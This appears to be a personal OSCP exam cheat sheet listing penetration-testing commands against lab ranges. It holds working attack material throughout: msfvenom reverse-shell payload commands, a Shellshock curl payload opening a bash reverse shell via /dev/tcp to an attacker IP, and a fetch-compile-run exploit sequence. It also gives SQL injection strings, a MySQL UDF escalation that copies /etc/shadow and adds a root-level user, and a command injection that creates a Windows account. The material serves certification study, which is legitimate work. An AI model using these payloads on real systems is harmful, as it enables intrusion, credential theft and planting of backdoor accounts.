# Arsenal
#oscp

[https://oscp.securable.nl/](https://oscp.securable.nl/)

### OpenVPN (Kali Linux)

```
sudo /usr/sbin/openvpn ~/Downloads/vpn.ovpn 
```

### NMAP #nmap

```
nmap -T4 -A -v -Pn 10.129.37.156

nmap --script smb-vuln* -Pn -p 137,139,445 10.129.1.111

nmap -Pn -AF -oA 06182017 -vvv 10.11.1.1-255

nmap -Pn -PS20,21,22,25,53,135,139,161,162,80,8080,443,8443,445,3389 --top-ports 1000 -sT -sV -O -A --reason --open --stats-every 30s -oA nmap-vuln-scan-10-11-1-1-0-24-2017-06-22 -vvv -d --script vuln 10.11.1.0/24

```

### Reverse Shell

Mac:

```
netcat -nvlp 4444
```

Linux:

```
nc -nvlp 4444
```

### WebShells

Windows:

* Powershell:
    * [https://github.com/samratashok/nishang/tree/master/Shells](https://github.com/samratashok/nishang/tree/master/Shells)

JSP:

PHP:

* [https://github.com/dotcppfile/DAws](https://github.com/dotcppfile/DAws)
* [https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)

### Escalation

#### Windows:

* Ethernal Blue:

### Web Recon

#### DirSearch

```
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u <URL> -e <EXTENSIONS>
```

#### Nikto

```
nikto -h 10.10.10.10
```

### WebShells

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* ASPX:
    * [https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx)
    * [https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)

Ethernal Blue (MS17-10)

* [https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)
* MSF
    * 
    *

Docker

* [https://blog.ropnop.com/docker-for-pentesters](https://blog.ropnop.com/docker-for-pentesters)

Metasploit

```
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

SMB

* [http://scx020c07c.blogspot.com/2012/09/exploitation-windows-xp-using.html](http://scx020c07c.blogspot.com/2012/09/exploitation-windows-xp-using.html)

MSF Venom

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.14 LPORT=4445 -f exe > shell.exe
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.14 LPORT=4445 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40” -a x86 --platform windows -f exe > shell.exe
```

#### List of SMB Pipelines

```
'browser','lsarpc','spoolss','360OnAccessGet','360OnAccessSet','aswUpdSv','afwCallbackPipe2','afwCallbackPipe2','aswUpdSv','_pspuser_780_AVGIDSMONITOR.EXE_9d97da47-8de1-4699-b3da-9eafb262f2a4','AVG7B14C58C-E30D-11DB-B553-F88A56D89593','AvgFwS8.WDCommunicationPipe1','AvgFwS8.WDCommunicationPipe2','AvgTrayPipeName000176','AvgTrayPipeName0001761','AvgTrayPipeName0001762','AvgFwS8.WDCommunicationPipe','_pspuser_3620_AVGIDSMONITOR.EXE_9fde9445-f261-4985-a056-fb033d1a64cd','AVG-CHJW-0B47172B-B945-42f8-AA88-8D4F98F660DB','AVG-CHJW-C81C2B71-E0F0-44cb-B6A7-15999D0F539A','AvgFw.WDCommunicationPipe','AvgFw.WDCommunicationPipe1','AvgFw.WDCommunicationPipe2','AvgTrayPipeName000840','AvgTrayPipeName0008401','AvgTrayPipeName0008402','AvgUIPipeName002788','AvgUIPipeName0027881','AvgUIPipeName0027882','AveSvc_EngineDienst200705311802','AveSvc_EngineService2008','avguard01','AVSCAN_REP_000000000000c883','AVWebCatServer0','AVWebGuardServer','AVWebProtServer0','SERVERPIPENAME','AveSvc_EngineService2008','bdantiphishing','bdantiphishing','bdantispam','EXTREG','LIVESRV','MIDASCOMM_SERVER','VSSERV','__fships_hook_server__','__fships_injector__','rcn_18871562230061','rcn_47843719166','rcn_49140823412','rcn_491711751329','rcn_50406860721','rcn_507341306237','rcn_51109653602','rcn_520781201855','rcn_520932065562','rcn_520932267096','rcn_522811486723','rcn_530461792332','rcn_53156781683','rcn_564531165073','rcn_580461750377','rcn_621562061643','rcn_637501693024','rcn_63750782962','rcn_647032361703','rcn_655781047893','rcn_655931694327','rcn_662811357824','rcn_67953938451','rcn_682651449794','rcn_685151921711','nai_vseconsole01','nai_vseconsole01','Symantec_{F9698F61-2E57-469B-B29B-1EFB17827356}_{0C55C096-0F1D-4F28-AAA2-85EF591126E7}','Symantec Core LC','Symantec_{586D4B8E-3DBB-4E4O-9A7E-4670F760FAC4}_{0C55C096-0F1D-4F28-AAA2-85EF591126E7}','Symantec_{EF903280-DA47-4C1B-99F8-EC15E7900956}_{0C55C096-0F1D-4F28-AAA2-85EF591126E7}','acsipc_server','pavfnlpc','Global\PNMIPC_SH_IPT-WebProxy','pavfnlpc','PavTPU\TPK_Event_1504','Sophos@BOPSv3','NP2970625197SRV','vmware-usbarbpipe'
```

#### Meterpreter

```
# Interact with session 1
sessions -i 1
# Get the User ID
getuid
# Send job to the background
background

# Migrate a process (When an exploit needs to run on top of an existing session)
migrate

# Suggest an exploit on an open session
use post/multi/recon/local_exploit_suggester

# Get the OS Info
sysinfo

# Spawn a shell
shell

# Show payloads to run
show payloads

# Show targets (OS’s)
show targets

# Show active jobs running in the background
jobs -l

# Show sessions open
sessions -l
# Kill session 1
sessions -k 1
```

#### Python

### Open a Bash Console

```
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py
```

### Simple HTTP Server

```
python -m SimpleHTTPServer 8000
```

#### Compile and run an exploit

```
wget http://10.10.12.128:8000/shell.c
gcc shell.c
chmod +x a.out
./a.out
```

### Linux

#### Get OS Version

```
uname -a
lsb_release -a
```

One line servers

```
https://gist.github.com/willurd/5720255
```

Stego

```
steghide extract -sf irked.jpg
```

Processes

```
find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;
```

Tools

* [https://github.com/Gallopsled/pwntools](https://github.com/Gallopsled/pwntools)

Apache

```
`curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/10.11.0.[X]/443 0>&1; echo zzzz;'" \
  http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'`
```

Windows

```
systeminfo
```

Webroot: c:\inetpub\wwwroot

WebDAV

```
import easywebdav
Webdav = eastwebdav.connect(’10.129.2.63’)

import easywebdav
# webdav = easywebdav.connect('10.11.1.13')

host = '10.11.1.229'
print 'Attempting to conenct to: ' + host

webdav = easywebdav.connect(host)

# webdav.mkdir('/modir')

webdav.upload('//media/root/OSCP/exploits/python/webdav/cmd.txt', '/modir/cmd.txt')
```

[https://www.qed42.com/blog/using-curl-commands-webdav](https://www.qed42.com/blog/using-curl-commands-webdav)

Cryptography

[https://bentrobotlabs.wordpress.com/2018/08/26/weak-rsa-challenge/](https://bentrobotlabs.wordpress.com/2018/08/26/weak-rsa-challenge/)

[https://stackoverflow.com/questions/42504079/how-do-you-extract-n-and-e-from-a-rsa-public-key-in-python](https://stackoverflow.com/questions/42504079/how-do-you-extract-n-and-e-from-a-rsa-public-key-in-python)

```
brew install mpfr
brew install libmpc
pip install gmpy2
pip3 install --upgrade pycrypto
# In Python 3.x, use int instead of long
pip3 uninstall PyCrypto
pip3 install -U PyCryptodome
```

[https://pycryptodome.readthedocs.io/en/latest/src/cipher/oaep.html](https://pycryptodome.readthedocs.io/en/latest/src/cipher/oaep.html)

[https://pycryptodome.readthedocs.io/en/latest/src/public_key/rsa.html](https://pycryptodome.readthedocs.io/en/latest/src/public_key/rsa.html)

Binaries

Note: when uploading EXE, use BINARY mode

Cross Compilation

```
C:\wmic os get OSArchitecture

sudo apt-get install mingw-w64

 
i686-w64-mingw32-gcc 40564.c -lws2_32 -o 40564.exe

i686-w64-mingw32-gcc 40564.c -o devel.exe -lws2_32

```

CMS

```
joomscan.pl -u <target-and-joomla-path>
cms-explorer  -url <target-and-joomla-path> -type joomla
wpscan.rb --url <target-and-wordpress-path&gt; --proxy <proxy-addr:port> -enumerate [u|p|v|t] 
cms-explorer  -url <target-and-wordpress-path> -type wordpress
```

SQL INJECTION

```
# SQL Terminators/Comments
# MSSQL and MySQL:
<sql injected command>;--
# MySQL:
<sql injected command>;#

# Login Pages Basic SQL injection 
# MS IIS
' OR '1=1';--

# MySQL
'OR 1=1;--
'OR 1=1;#
'OR 1=1 LIMIT 1;#

# Enumerate number of columns/fields
...UNION SELECT 1;--
...UNION SELECT 1,2;--
...UNION SELECT 1,2,3;--

# Load file by injecting into the vulnerable field - encode string if necessary
…UNION ALL SELECT NULL,LOAD_FILE(‘<user-readable-file>’),NULL,NULL;-- …UNION ALL SELECT NULL,LOAD_FILE(‘<user-readable-file>’),NULL,NULL INTO OUTFILE ‘<writeable-path-or-web-directorygt;’;--

# Dump/Write to file
# (see encode text/shell to hex, base64)
...SELECT * FROM mytable INTO DUMPFILE ‘<writeable-path-or-web-directorygt;’; —
...SELECT * FROM mytable INTO OUTFILE ‘<writeable-path-or-web-directorygt;’; —

# MySQL <5.0 User Defined Functions
# command execution and privilege escalation with mysql running as root/SYSTEM
mysql> use mysql;
mysql> create table <table-name>(line blob);
Query OK, 0 rows affected (0.00 sec)
mysql> insert into <table-name> values(load_file('<path-to-udf.so-file>');
Query OK, 1 rows affected (0.00 sec)
mysql> select * from <table-name> into dumpfile '/usr/lib/lib_mysqludf_sys.so';
Query OK, 1 rows affected (0.00 sec)
mysql> create function <name_of_new_function> returns int soname 'lib_mysqludf_sys.so';
# Example command execution with the new function:
mysql> set @status := <name_of_new_function>('cat /etc/shadow > /tmp/shadow');
Query OK, 0 rows affected (0.06 sec)
mysql> set @status := <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>');
Query OK, 0 rows affected (0.06 sec)
mysql> set @status := <name_of_new_function>('echo <new-username>:<chosen-password> | /usr/sbin/chpasswd');
Query OK, 0 rows affected (0.06 sec)
or
mysql> select <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>');
+----------------------------------------------------------------------------------------------------------------------------------------------------------+
| <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>'); |+----------------------------------------------------------------------------------------------------------------------------------------------------------+
| 4294967296                                                                                                                                       | +----------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (1.70 sec)
```

SQL MAP

```
sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" -p <injectable-parameter> --banner --current-db --current-user --is-dba

Enumerate User Passwords
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --passwords

List of Databases
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --dbs

Retrieve tables from specific Database
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --tables -D <database-name>

Dump specific table contents
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --dump -D <database-name> -T <table-name>

Retrieve system /etc/password file
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/passwd

Retrieve apache2 configuration file to identify live website config files
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/apache2.conf

Retrieve default configuration file to subsequently identify Document Root (web directory location)
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/sites-enabled/000-default

Retrieve CMS/Web app default configuration file if possible
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=<Document-root-path>/<Web-Application-Path>/<configuration-file>
```

```
10.129.1.127/search=%00{.exec|cmd /c net user testuser testpassword /add.}
```

SNMP

SNMPWalk

```
snmpwalk -Os -c public -v 10.129.1.179 -v1
```

LineEnum

Find Privilege Escalation in Linux Machines

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
